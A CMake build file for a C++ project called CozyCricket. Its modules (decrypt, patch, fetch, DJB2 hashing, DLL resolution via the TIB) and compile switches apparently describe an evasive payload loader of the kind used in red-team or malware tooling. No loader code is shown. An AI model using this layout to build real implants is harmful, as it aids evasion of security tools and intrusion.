cmake_minimum_required(VERSION 3.15)
project(CozyCricket LANGUAGES CXX)

set(CMAKE_EXE_LINKER_FLAGS "-static")

set(CMAKE_CXX_STANDARD 23)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

### ----- START CHANGEME -----
add_definitions(-DRETRIEVE_LOCAL -DHASH_DJB2 -DRESOLVEDLL_TIB)
### ----- END CHANGEME -----

add_executable(cozycricket
    main.cpp
    decrypt/decrypt.cpp
    patch/patch.cpp
    retrieve/fetch.cpp
    hash/hash.cpp
    resolve/resolve_dll.cpp
)

find_package(OpenSSL REQUIRED)
find_package(cpr CONFIG REQUIRED)

target_link_libraries(cozycricket PRIVATE
    OpenSSL::SSL
    OpenSSL::Crypto
    cpr::cpr
)

